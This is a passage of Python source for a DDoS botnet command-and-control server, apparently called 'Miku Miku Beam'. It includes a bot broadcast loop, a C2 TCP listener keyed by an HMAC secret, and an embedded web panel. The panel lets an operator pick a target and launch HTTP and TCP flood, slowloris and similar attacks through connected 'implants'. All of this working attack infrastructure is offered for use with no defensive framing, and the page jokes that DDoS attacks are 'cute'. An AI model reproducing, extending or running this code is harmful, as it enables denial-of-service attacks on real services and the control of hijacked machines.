                ui_state["_last_stats_log"] = {}
                attack_gen += 1
                current_gen = attack_gen
            ui_ws_broadcast({"type":"attack_started"})
            ui_log(f"Miku Miku Beam from server to {target} ({method})", "ok")
            payload = json.dumps({"target":target,"method":method,"pktsize":pktsize,
                "duration":duration,"delay_ms":delay_ms,"threads":threads}, separators=(",",":"))
        n = broadcast_cmd("ddos_start " + payload, kind="ddos_start", gen=current_gen)
        if n == 0:
            with attack_lock:
                with ui_lock:
                    if ui_state["attack_running"]:
                        ui_state["attack_running"] = False
                        ui_state["had_attack"] = False
            ui_ws_broadcast({"type":"finished","reason":"no bots accepted"})
            self._json({"detail":"no bots accepted"}, 409); return
        self._json({"ok": True, "bots": n})

    def _api_stop(self):
        global attack_gen
        with attack_lock:
            attack_gen += 1
            my_gen = attack_gen
        with lock:
            before_cids = set(in_flight.keys())
        n = broadcast_cmd("ddos_stop", kind="ddos_stop")
        with lock:
            after_cids = set(in_flight.keys())
            stop_cids = after_cids - before_cids
        ui_log(f"ddos_stop → {n} ботов", "warn")

        def wait_for_stop():
            deadline = time.time() + 6.0
            pending = set(stop_cids)
            while pending and time.time() < deadline:
                time.sleep(0.1)
                with lock:
                    if attack_gen != my_gen: return
                    done = {c for c in pending
                            if in_flight.get(c, {}).get("state") in ("DONE","LOST","ORPHANED")}
                    pending -= done
                with lock:
                    for c in pending:
                        r = in_flight.get(c)
                        if r and r.get("state") == "ORPHANED":
                            ui_log(f"ddos_stop для {r['bot_id']} ORPHANED — бот не получил stop", "err")
            with lock:
                if attack_gen != my_gen: return
                remaining = [c for c in pending if in_flight.get(c, {}).get("state") in ("SENT","ACKED")]
            if remaining:
                ui_log(f"ddos_stop: {len(remaining)} ботов не ответили за 6 с", "warn")
            with ui_lock:
                if attack_gen != my_gen: return
                ui_state["attack_running"] = False
                ui_state["had_attack"] = False
            ui_ws_broadcast({"type":"attack_stopped"})
            ui_ws_broadcast({"type":"finished"})
            ui_log("Атака остановлена", "ok")
        threading.Thread(target=wait_for_stop, daemon=True).start()
        self._json({"ok": True, "bots": n})

    def _handle_ws(self):
        key = self.headers.get("Sec-WebSocket-Key","")
        if self.headers.get("Upgrade","").lower() != "websocket" or not key:
            self.send_error(400); return
        self.connection._ws_keep = True; self.close_connection = True
        accept = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
        self.send_response_only(101)
        self.send_header("Upgrade","websocket"); self.send_header("Connection","Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept); self.end_headers()
        try: self.wfile.flush()
        except OSError: return
        entry = {"conn": self.connection, "addr": self.client_address,
                 "send_lock": threading.Lock(), "authed": False}
        with ws_lock: ws_clients.append(entry)
        threading.Thread(target=ws_client_loop, args=(entry,), daemon=True).start()

INDEX_HTML = r"""<!doctype html>
<html lang="ru"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Miku Miku Beam</title>
<style>
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,sans-serif;
 background:radial-gradient(1200px 600px at 50% 0%,#f5d9f2 0%,#ede9fb 45%,#e9e5fb 100%);
 min-height:100vh;color:#2a1d3a}
.page{max-width:720px;margin:0 auto;padding:40px 20px 60px}
h1{font-family:"Comic Sans MS","Chalkboard SE",cursive;font-size:42px;text-align:center;
 margin:0 0 6px;background:linear-gradient(90deg,#ff7bb0 0%,#b35dff 100%);
 -webkit-background-clip:text;background-clip:text;color:transparent;letter-spacing:.5px}
.subtitle{text-align:center;color:#6b5b7a;margin:0 0 28px;font-size:14px}
.card{background:#fff;border-radius:18px;padding:22px;
 box-shadow:0 20px 60px rgba(160,100,200,.18),0 2px 6px rgba(160,100,200,.10)}
.banner{position:relative;border-radius:14px;overflow:hidden;height:180px;margin-bottom:20px;
 background:linear-gradient(135deg,#5a3ff0 0%,#a13bff 55%,#f06ab5 100%);
 display:flex;align-items:center;justify-content:center}
.banner img{width:100%;height:100%;object-fit:cover;object-position:center;display:block}
.banner-fallback{color:#fff;font-size:48px;letter-spacing:6px;display:none}
.row{display:flex;gap:12px}
.target-row{margin-bottom:14px}
.params-row{gap:14px;margin-bottom:18px;flex-wrap:wrap}
.params-row .field{flex:1 1 140px;min-width:130px}
.field label{display:block;font-size:12px;font-weight:600;color:#6b5b7a;margin-bottom:6px}
.field input,.field select{width:100%;padding:10px 12px;border:1px solid #e2d9ee;
 border-radius:10px;font-size:14px;background:#fff;color:#2a1d3a;outline:none}
#target{flex:1;padding:12px 14px;border:1px solid #e2d9ee;border-radius:10px;font-size:14px;outline:none}
.btn-primary{padding:12px 20px;border:none;border-radius:10px;
 background:linear-gradient(90deg,#ff5e93 0%,#d648c9 100%);color:#fff;font-weight:600;
 font-size:14px;cursor:pointer;white-space:nowrap}
.btn-stop{background:linear-gradient(90deg,#ff2d2d 0%,#c91414 100%)!important}
.btn-icon{width:42px;height:42px;border:none;border-radius:10px;background:#f3ecfb;
 color:#7a5ba8;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center}
.btn-danger{background:#ff5e5e;color:#fff}
.stats-row{gap:14px;margin-bottom:18px}
.stat{flex:1;background:linear-gradient(180deg,#fbf7ff 0%,#f6eefc 100%);
 border-radius:12px;padding:14px 16px;border:1px solid #efe4fb}
.stat-label{font-size:12px;color:#8b6ea8;margin-bottom:8px;font-weight:600}
.stat-value{font-size:24px;font-weight:800;color:#2a1d3a}
.progress-wrap{height:10px;background:#f0eaf7;border-radius:6px;overflow:hidden;margin-bottom:16px}
.progress{height:100%;width:0%;background:linear-gradient(90deg,#ff5e93 0%,#7c5cff 60%,#4a9eff 100%);border-radius:6px;transition:width .2s}
.console{background:#0f1220;color:#7ef0a3;font-family:"JetBrains Mono",Menlo,Consolas,monospace;
 font-size:12.5px;padding:16px;border-radius:12px;min-height:120px;max-height:260px;
 overflow-y:auto;margin:0;white-space:pre-wrap;line-height:1.6}
.console .l-warn{color:#ffd76e} .console .l-err{color:#ff7b7b}
.console .l-info{color:#7ec7ff} .console .l-ok{color:#7ef0a3}
.hint{font-size:11px;color:#8b6ea8;margin-top:4px}
.login{position:fixed;inset:0;background:rgba(10,5,20,.85);display:none;align-items:center;justify-content:center;z-index:1000}
.login.open{display:flex}
.login-box{background:#fff;padding:24px;border-radius:14px;min-width:280px}
.login-box input{width:100%;padding:10px;border:1px solid #e2d9ee;border-radius:8px;font-size:14px;margin:8px 0}
.login-box button{width:100%;padding:10px;border:none;border-radius:8px;
 background:linear-gradient(90deg,#ff5e93,#d648c9);color:#fff;font-weight:600;cursor:pointer}
.footer{text-align:center;margin-top:28px;color:#6b5b7a;font-size:13px}
</style></head><body>
<div class="page">
<h1>Miku Miku Beam</h1>
<p class="subtitle">Because DDoS attacks are also cute and even more so when Miku does them.</p>
<div class="card">
 <div class="banner">
  <img src="https://media.tenor.com/UcpzfXzOr0MAAAAM/miku-miku-beam-hatsune-miku.gif"
       onerror="this.style.display='none'; document.getElementById('banner-fallback').style.display='block';">
  <div id="banner-fallback" class="banner-fallback">MIKU</div>
 </div>
 <div class="row target-row">
  <input id="target" placeholder="Enter target URL or IP">
  <button id="start" class="btn-primary">🪄 Start Miku Beam</button>
  <button id="stop" class="btn-icon">⚡</button>
  <button id="logs" class="btn-icon">📜</button>
  <button id="exit" class="btn-icon btn-danger" title="Exit all implants">✖</button>
 </div>
 <div class="row params-row">
  <div class="field"><label>Attack Method</label>
   <select id="method">
    <option value="http_flood">HTTP/Flood</option>
    <option value="http_burst">HTTP/Burst</option>
    <option value="http_bypass">HTTP/Bypass</option>
    <option value="http_slowloris">HTTP/Slowloris</option>
    <option value="tcp_flood">TCP/Flood</option>
    <option value="tcp_burst">TCP/Burst</option>
    <option value="tcp_slowloris">TCP/Slowloris</option>
    <option value="minecraft_ping">Minecraft/Ping</option>
   </select></div>
  <div class="field"><label>Packet Size (kb)</label>
   <input id="pktsize" type="number" value="64" min="1" max="1400"></div>
  <div class="field"><label>Duration (seconds)</label>
   <input id="duration" type="number" value="60" min="5" max="3600"></div>
  <div class="field"><label>Packet Delay (ms)</label>
   <input id="delay" type="number" value="0" min="0" max="10000"></div>
  <div class="field"><label>Threads</label>
   <input id="threads" type="number" value="8" min="1" max="64"></div>
 </div>
 <div class="row stats-row">
  <div class="stat"><div class="stat-label">⚡ Packets/sec</div><div class="stat-value" id="pps">0</div></div>
  <div class="stat"><div class="stat-label">🖥 Active Bots</div><div class="stat-value" id="bots">0</div></div>
  <div class="stat"><div class="stat-label">📶 Total Packets</div><div class="stat-value" id="total">0</div></div>
 </div>
 <div class="progress-wrap"><div class="progress" id="progress"></div></div>
 <pre class="console" id="console"></pre>
 <div class="hint" id="lan-hint"></div>
</div>
<div class="footer"><span>♪ v2.19 ♪</span></div>
</div>
<div class="login" id="loginModal"><div class="login-box">
  <h3 style="margin:0 0 10px">UI Login</h3>
  <input id="loginPass" type="password" placeholder="password">
  <button id="loginBtn">Login</button>
  <div id="loginErr" style="color:#d00;font-size:12px;margin-top:8px;"></div>
</div></div>
<script>
const $=id=>document.getElementById(id);
const C=$("console"), P=$("progress");
let ws=null,isAttacking=false,attackTimer=null,autoScroll=true,C2_TOKEN="",tokenRefreshTimer=null;
const ATTACK_DELAY_MS = __ATTACK_DELAY_MS__;
const AUDIO_URL = __AUDIO_URL__;
C.addEventListener("scroll",()=>{autoScroll=C.scrollTop+C.clientHeight>=C.scrollHeight-8;});
function log(m,k){const c=k==="warn"?"l-warn":k==="err"?"l-err":k==="info"?"l-info":k==="ok"?"l-ok":"";
 const l=document.createElement("div");l.className=c;
 l.textContent="["+new Date().toLocaleTimeString()+"] › "+String(m);
 C.appendChild(l);while(C.childNodes.length>500)C.removeChild(C.firstChild);
 if(autoScroll)C.scrollTop=C.scrollHeight;}
let audioEl=null;
function playMikuBeam(){try{if(!audioEl){audioEl=new Audio(AUDIO_URL);audioEl.loop=false;}audioEl.currentTime=0;
 const p=audioEl.play();if(p&&p.catch)p.catch(err=>log("Audio: "+err.message,"warn"));}catch(e){log("Audio: "+e.message,"warn");}}
function stopMikuBeam(){if(audioEl){try{audioEl.pause();audioEl.currentTime=0;}catch(e){}}}
function authHeaders(x){const h=Object.assign({},x||{});if(C2_TOKEN)h["X-C2-Token"]=C2_TOKEN;return h;}
async function loginWithPassword(p){const r=await fetch("/api/ui-token",{method:"POST",headers:{"Content-Type":"application/json"},
 body:JSON.stringify({password:p})});if(!r.ok){const t=await r.text();throw new Error("login: "+r.status+" "+t.slice(0,120));}
 const j=await r.json();C2_TOKEN=j.token||"";return C2_TOKEN;}
function scheduleTokenRefresh(){if(tokenRefreshTimer)clearInterval(tokenRefreshTimer);
 tokenRefreshTimer=setInterval(async()=>{if(!C2_TOKEN)return;
 try{const r=await fetch("/api/ui-refresh",{method:"POST",headers:authHeaders()});
 if(!r.ok){C2_TOKEN="";if(ws){try{ws.close();}catch(e){}ws=null;}promptLogin();return;}
 const j=await r.json();C2_TOKEN=j.token||C2_TOKEN;}catch(e){log("Token refresh: "+e.message,"warn");}},60000);}
function promptLogin(){$("loginErr").textContent="";$("loginModal").classList.add("open");}
$("loginBtn").onclick=async()=>{const p=$("loginPass").value;
 try{await loginWithPassword(p);$("loginModal").classList.remove("open");$("loginPass").value="";
 scheduleTokenRefresh();if(!ws||ws.readyState!==WebSocket.OPEN)connect();}
 catch(e){$("loginErr").textContent=e.message;}};
async function tryInitToken(){try{const cfg=await fetch("/api/ui-config",{method:"POST"});const j=await cfg.json();
 if(j.auth_required)return false;C2_TOKEN="";return true;}catch(e){return false;}}
async function connect(){if(ws){try{ws.onclose=null;ws.close();}catch(e){}ws=null;}
 const proto=location.protocol==="https:"?"wss":"ws";
 ws=new WebSocket(proto+"://"+location.host+"/ws/ui");
 ws.onopen=()=>{if(C2_TOKEN)ws.send(JSON.stringify({type:"auth",token:C2_TOKEN}));};
 ws.onmessage=e=>{let m;try{m=JSON.parse(e.data);}catch(err){return;}
  if(m.type==="init"){$("bots").textContent=m.active_bots;
   $("total").textContent=Number(m.total_packets||0).toLocaleString();
   (m.log||[]).slice(-10).forEach(x=>log(x.msg,x.kind));
   if(m.lan_ips&&m.lan_ips.length)$("lan-hint").textContent="LAN IP: "+m.lan_ips.join(", ");
   if(m.attack_running)setButtonStop();else setButtonStart();}
  else if(m.type==="log")log(m.entry.msg,m.entry.kind);
  else if(m.type==="stats"){$("pps").textContent=Number(m.pps||0).toLocaleString();
   $("total").textContent=Number(m.total||0).toLocaleString();
   if(typeof m.progress==="number")P.style.width=(m.progress*100).toFixed(1)+"%";}
  else if(m.type==="bots")$("bots").textContent=m.count;
  else if(m.type==="finished"){
    if(m.reason){P.style.width="0%";log("Attack failed: "+m.reason,"err");}
    else       {P.style.width="100%";log("Attack finished.","ok");}
    setButtonStart();
  }
  else if(m.type==="attack_started"){if(attackTimer){clearTimeout(attackTimer);attackTimer=null;}setButtonStop();}
  else if(m.type==="attack_stopped"){setButtonStart();P.style.width="0%";}};
 ws.onclose=()=>{log("Disconnected","warn");ws=null;setTimeout(boot,2000);};
 ws.onerror=()=>{};}
function setButtonStop(){const b=$("start");b.textContent="🪄 Stop Beam";b.classList.add("btn-stop");isAttacking=true;}
function setButtonStart(){const b=$("start");b.textContent="🪄 Start Miku Beam";b.classList.remove("btn-stop");isAttacking=false;}
async function reallyStartAttack(){const body={target:$("target").value.trim(),method:$("method").value,
 packet_size_kb:parseInt($("pktsize").value,10)||64,
 duration_sec:parseInt($("duration").value,10)||60,
 packet_delay_ms:parseInt($("delay").value,10)||0,
 threads:parseInt($("threads").value,10)||8};
 if(!body.target){log("Enter target first.","err");return;}
 try{const r=await fetch("/api/attack",{method:"POST",
   headers:authHeaders({"Content-Type":"application/json"}),body:JSON.stringify(body)});
  const j=await r.json().catch(()=>({}));
  if(!r.ok){log("Error: "+(j.detail||r.statusText),"err");setButtonStart();return;}
  P.style.width="0%";log(`🪄 attack → ${j.bots} bots`,"ok");}
 catch(e){log("Network error: "+e.message,"err");setButtonStart();}}
async function startAttack(){const tgt=$("target").value.trim();
 if(!tgt){log("Enter target first.","err");return;}
 if(!ws||ws.readyState!==WebSocket.OPEN){log("WS not connected","err");return;}
 let check;try{const r=await fetch("/api/attack/check",{method:"POST",headers:authHeaders()});check=await r.json();}
 catch(e){log("Check failed: "+e.message,"err");return;}
 if(!check.ok){log("❌ "+check.reason,"err");return;}
 if(!check.bots||check.bots<=0){log("❌ 0 bots","err");return;}
 setButtonStop();playMikuBeam();
 log(`🪄 Miku Miku Beam → ${tgt} (${check.bots} bots)`,"ok");
 const t0=Date.now();
 const delayTimer=setInterval(()=>{const p=Math.min(100,((Date.now()-t0)/ATTACK_DELAY_MS)*100);
  P.style.width=p.toFixed(1)+"%";if(p>=100)clearInterval(delayTimer);},100);
 if(attackTimer)clearTimeout(attackTimer);
 attackTimer=setTimeout(async()=>{attackTimer=null;await reallyStartAttack();},ATTACK_DELAY_MS);}
async function stopAttack(){if(attackTimer){clearTimeout(attackTimer);attackTimer=null;}
 stopMikuBeam();setButtonStart();P.style.width="0%";
 try{await fetch("/api/stop",{method:"POST",headers:authHeaders()});}catch(e){}}
$("start").onclick=async()=>{if(isAttacking){await stopAttack();}else{await startAttack();}};
$("stop").onclick=stopAttack;
$("exit").onclick=async()=>{if(!confirm("Exit all implants?"))return;
 try{await fetch("/api/exit",{method:"POST",headers:authHeaders()});}catch(e){}};
$("logs").onclick=()=>{autoScroll=true;C.scrollTop=C.scrollHeight;};
async function boot(){const ok=await tryInitToken();if(!ok){promptLogin();return;}
 scheduleTokenRefresh();connect();}
boot();
</script></body></html>"""


def main():
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} <c2_port> <ui_port>")
        return 1
    try: c2_port = int(sys.argv[1]); ui_port = int(sys.argv[2])
    except ValueError: print("ports must be integers"); return 1

    _load_bots()

    if not QUIET_PSK:
        print("=" * 60)
        print("[*] HMAC PSK (вписать в client.c или C2_PSK env):")
        print(f"    {PSK.hex()}")
        if PSK_PREV:
            print(f"[*] PSK_PREV (для ротации): {PSK_PREV.hex()}")
        print("=" * 60)
    else:
        print("[*] HMAC PSK hidden (C2_QUIET_PSK=1)")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", c2_port)); srv.listen(16)
    print(f"[*] C2 TCP :{c2_port}")

    httpd = C2HTTPServer(("0.0.0.0", ui_port), UIHandler)
    print(f"[*] UI HTTP :{ui_port}  auth={'on' if UI_PASSWORD else 'off'}")

    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
    threading.Thread(target=reaper, daemon=True).start()
    threading.Thread(target=ws_stats_loop, daemon=True).start()
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    try:
        while True:
            try: line = input("c2> ").strip()
            except EOFError: break
            if not line: continue
            if line == "list": list_bots()
            elif line == "quit": break
            else: broadcast_cmd(line)
    except KeyboardInterrupt: pass
    finally:
        _save_bots()
        with lock:
            for b in bots.values():
                if b.get("alive") and b.get("sock"):
                    try: b["sock"].shutdown(socket.SHUT_RDWR)
                    except OSError: pass
                    try: b["sock"].close()
                    except OSError: pass
                    b["alive"] = False
        srv.close()
        try: httpd.shutdown(); httpd.server_close()
        except Exception: pass
    return 0

if __name__ == "__main__":
    sys.exit(main())
